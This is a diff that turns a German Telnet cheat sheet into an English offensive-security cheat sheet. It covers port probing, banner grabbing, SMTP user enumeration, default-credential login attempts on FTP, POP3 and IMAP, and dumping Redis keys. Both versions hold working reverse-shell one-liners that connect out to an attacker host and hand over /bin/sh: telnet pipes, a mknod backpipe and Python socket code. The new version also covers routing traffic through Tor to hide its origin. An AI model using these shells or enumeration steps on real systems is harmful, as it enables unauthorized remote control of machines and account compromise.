@@ -1,163 +1,179 @@
-# Telnet
+# test network services with telnet because netcat isn't always installed. example: probe ports, send http requests, banner grab
 
-Telnet ist ein Netzwerkprotokoll, das vorwiegend für die Kommunikation mit entfernten Systemen über eine Text-basierte Konsole genutzt wird. In modernen Anwendungen wird es oft verwendet, um mit verschiedenen Diensten und Servern zu interagieren, Fehler zu diagnostizieren oder Dienste zu testen. Dieses Cheatsheet bietet eine Übersicht zu grundlegenden Telnet-Befehlen und Anwendungsfällen, einschließlich der Identifizierung und Interaktion mit verschiedenen Diensten.
-
-***
-
-**1. Grundlegende Telnet-Befehle**
-
-*   **Verbindung zu einem Host herstellen:** Um eine Verbindung zu einem Server auf einem spezifischen Port herzustellen, kann der folgende Befehl verwendet werden:
-
-    ```bash
-    telnet <IP-Adresse> <Port>
-    ```
-
-    Beispiel:
-
-    ```bash
-    telnet 192.168.1.1 80
-    ```
-* **Verbindung schließen:** Um die Telnet-Sitzung zu beenden, drückt man `Ctrl+]`, um den Telnet-Befehlsprompt zu öffnen, und gibt dann den Befehl `quit` ein.
-* **Interaktive Eingabe von Befehlen:** In der Telnet-Sitzung können beliebige Befehle zur Kommunikation mit dem Server eingegeben werden. Dies ist besonders nützlich für manuelle HTTP- oder FTP-Anfragen.
-
-***
-
-**2. Telnet für Webdienste (HTTP)**
-
-Telnet eignet sich gut, um mit HTTP-Servern zu kommunizieren. Hiermit können HTTP-Anfragen manuell gesendet und die Serverantworten analysiert werden.
-
-*   **Beispiel einer HTTP-GET-Anfrage:**
-
-    ```bash
-    GET / HTTP/1.1
-    Host: <Ziel-Host>
-    ```
-
-    Beispiel:
-
-    ```bash
-    GET /index.html HTTP/1.1
-    Host: example.com
-    ```
-*   **Beispiel einer HTTP-POST-Anfrage:**
-
-    ```bash
-    POST /submit HTTP/1.1
-    Host: <Ziel-Host>
-    Content-Length: <Länge der Daten>
-
-    <Daten>  # Hier die zu sendenden Daten eingeben
-    ```
-
-***
-
-**3. Identifizierung von Diensten über Telnet**
-
-Telnet kann verwendet werden, um verschiedene Dienste, die auf bestimmten Ports laufen, zu identifizieren. Nach der Herstellung einer Verbindung kann der Dienst an der Antwort des Servers erkannt werden.
-
-| **Port** | **Dienst**         | **Beschreibung**                                           |
-| -------- | ------------------ | ---------------------------------------------------------- |
-| 21       | FTP                | File Transfer Protocol, zum Übertragen von Dateien         |
-| 22       | SSH                | Secure Shell, für verschlüsselte Remote-Verbindungen       |
-| 23       | Telnet             | Terminalprotokoll für unverschlüsselte Remote-Verbindungen |
-| 25       | SMTP               | Simple Mail Transfer Protocol, für E-Mail-Übertragungen    |
-| 53       | DNS                | Domain Name System, für Domainnamensauflösungen            |
-| 80       | HTTP               | Hypertext Transfer Protocol, Standard für Webseiten        |
-| 443      | HTTPS              | HTTP über SSL/TLS für sichere Webseiten                    |
-| 3306     | MySQL              | Datenbankdienst für MySQL                                  |
-| 8080     | HTTP (Alternative) | Web-Server, oft für Proxy-Dienste oder alternative Ports   |
-
-**Beispiel: Telnet zu einem HTTP-Server**
-
+## basic connections
 ```bash
-telnet example.com 80
+telnet 192.168.1.1 80          # connect to port 80
+telnet google.com 443          # connect to https port
+nc -nv 192.168.1.1 80          # netcat alternative (if available)
 ```
 
-Dann kann eine HTTP-GET-Anfrage wie folgt eingegeben werden:
-
+## exit telnet session
 ```bash
+# in session: ctrl+] then type quit
+# or just ctrl+c to force exit
+```
+
+## common port testing
+```bash
+telnet target 21               # ftp
+telnet target 22               # ssh (will show version)
+telnet target 23               # telnet service
+telnet target 25               # smtp
+telnet target 53               # dns
+telnet target 80               # http
+telnet target 110              # pop3
+telnet target 143              # imap
+telnet target 443              # https
+telnet target 993              # imaps
+telnet target 995              # pop3s
+telnet target 3306             # mysql
+telnet target 5432             # postgresql
+telnet target 8080             # http alternate
+```
+
+## http requests via telnet
+```bash
+# basic get request
+telnet example.com 80
 GET / HTTP/1.1
 Host: example.com
+Connection: close
+
+# get specific page
+GET /admin HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Connection: close
+
+# post request
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 23
+
+user=admin&pass=secret
 ```
 
-**Beispiel: Telnet zu einem FTP-Server**
-
+## service banner grabbing
 ```bash
-telnet example.com 21
+# grab service banners
+telnet target 21               # ftp: "220 (vsFTPd 3.0.3)"  
+telnet target 22               # ssh: "SSH-2.0-OpenSSH_7.4"
+telnet target 25               # smtp: "220 mail.target.com ESMTP"
+telnet target 3306             # mysql: "5.7.32-log MySQL"
 ```
 
-Die Antwort könnte etwa so aussehen:
-
-```
-220 (vsFTPd 3.0.3) Welcome message
-```
-
-Nun kann man typische FTP-Befehle wie `USER`, `PASS` oder `LIST` verwenden, um mit dem Server zu interagieren.
-
-***
-
-**4. Erkennung von Diensten**
-
-Nach der Herstellung einer Telnet-Verbindung kann die Antwort des Servers genutzt werden, um den ausgeführten Dienst zu identifizieren.
-
-* **FTP:** Antwort beginnt typischerweise mit `220`, gefolgt von einer Versionsnummer des FTP-Servers (z.B., `220 (vsFTPd 3.0.3)`).
-* **SMTP:** Antwort beginnt oft mit `220` und enthält eine Beschreibung des Mail-Servers.
-* **HTTP:** Antwort beginnt mit dem HTTP-Protokoll und einem Statuscode, z.B., `HTTP/1.1 200 OK`.
-* **MySQL:** Antwort beginnt mit einer Versionsnummer von MySQL, z.B., `5.7.32-log MySQL Community Server`.
-* **SSH:** Antwort beginnt mit `SSH-2.0` gefolgt von einer Versionsnummer, z.B., `SSH-2.0-OpenSSH_7.4p1`.
-
-***
-
-**5. Nutzung von Telnet für Interaktive Shells**
-
-Telnet kann verwendet werden, um mit Diensten zu interagieren, die eine **interaktive Shell** anbieten. Beispielsweise kann über Telnet auf einen MySQL-Server zugegriffen werden.
-
-**Beispiel: Telnet zu einem MySQL-Server**
-
+## smtp enumeration
 ```bash
-telnet example.com 3306
+telnet target 25
+EHLO attacker.com
+VRFY root                      # verify user exists
+EXPN admin                     # expand mailing list
+RCPT TO: user@target.com       # check if user exists
 ```
 
-Die Antwort könnte eine MySQL-Version angeben:
-
+## ftp interaction
+```bash
+telnet target 21
+USER anonymous                 # try anonymous login
+PASS anything
+USER admin                     # try common usernames
+PASS admin
+LIST                          # list files
+RETR filename.txt             # download file
 ```
-5.7.32-log MySQL Community Server (GPL)
+
+## pop3/imap testing
+```bash
+# pop3
+telnet target 110
+USER admin
+PASS password
+LIST                          # list emails
+RETR 1                        # retrieve email 1
+
+# imap
+telnet target 143
+a1 LOGIN admin password
+a2 LIST "" "*"                # list mailboxes
+a3 SELECT INBOX               # select inbox
+a4 FETCH 1 BODY[]             # fetch email body
 ```
 
-Hier könnte man versuchen, SQL-Befehle oder Schwachstellen wie SQL-Injection zu nutzen, um weitere Informationen zu erlangen.
+## automated banner grabbing
+```bash
+# bash script for multiple ports
+for port in 21 22 23 25 53 80 110 443 993 995 3306 5432 8080; do
+    echo "Testing port $port"
+    timeout 3 telnet target $port 2>/dev/null || echo "Port $port closed"
+done
 
-***
+# one-liner port scan
+echo "quit" | telnet target 80 2>/dev/null | head -5
+```
 
-**6. Sicherheitsüberlegungen**
+## reverse shell via telnet
+```bash
+# linux reverse shell
+telnet attacker_ip 4444 | /bin/bash | telnet attacker_ip 4445
 
-Telnet überträgt alle Daten, einschließlich Passwörtern, unverschlüsselt. Daher sollte Telnet nur in sicheren, vertrauenswürdigen Netzwerken verwendet werden. Wenn Anonymität oder Verschlüsselung erforderlich sind, sollte man auf sicherere Alternativen wie **SSH** oder **Tor** zurückgreifen.
+# or use built-in reverse shell  
+mknod /tmp/backpipe p
+/bin/sh 0</tmp/backpipe | telnet attacker_ip 4444 1>/tmp/backpipe
 
-*   **Anonymität mit Tor:** Es ist möglich, Telnet-Verbindungen über das Tor-Netzwerk zu tunneln, um die Herkunft der Anfrage zu verbergen. Dies kann durch den Einsatz von Tools wie **proxychains** erreicht werden:
+# python reverse shell
+python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('10.10.10.10', 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call(['/bin/sh', '-i'])"
+```
 
-    ```bash
-    proxychains telnet example.com 80
-    ```
+## service-specific interactions
+```bash
+# mysql interaction
+telnet target 3306
+# look for version in response, might allow injection
 
-***
+# redis interaction  
+telnet target 6379
+INFO                          # get redis info
+KEYS *                        # list all keys
+GET keyname                   # get key value
 
-**7. Telnet-Skripting**
+# memcached interaction
+telnet target 11211
+stats                         # get statistics
+get keyname                   # retrieve cached item
+```
 
-Telnet kann auch automatisiert werden, um wiederholte Interaktionen zu erleichtern. Ein einfaches Bash-Skript könnte verwendet werden, um HTTP-Anfragen über Telnet zu senden.
-
-Beispiel eines Bash-Skripts:
-
+## scripted telnet usage
 ```bash
 #!/bin/bash
-telnet example.com 80 <<EOF
-GET / HTTP/1.1
-Host: example.com
-EOF
+# automated http request
+{
+    echo "GET / HTTP/1.1"
+    echo "Host: $1"
+    echo "Connection: close"
+    echo ""
+} | telnet $1 80
+
+# save as http_check.sh, use: ./http_check.sh example.com
 ```
 
-***
+## telnet over proxy
+```bash
+# through tor (needs proxychains)
+proxychains telnet target.onion 80
 
-### Oneline Reverse-Shells
+# through socks proxy
+ssh -D 8080 user@proxy_server
+# then configure app to use socks proxy at 127.0.0.1:8080
+```
 
-#### Python
+## (._.) gotchas
+```bash
+# telnet sends each keypress immediately
+# use netcat instead for file transfers
+# ssl/tls services will show garbled text
+# modern services may drop connection immediately
+# some services need specific protocols (http/1.1 vs http/1.0)
+```
 
-`import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.115.149", 8888)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call(["/bin/sh", "-i"])`
+# TODO: add telnet protocol negotiation, telnet options, binary mode transfers
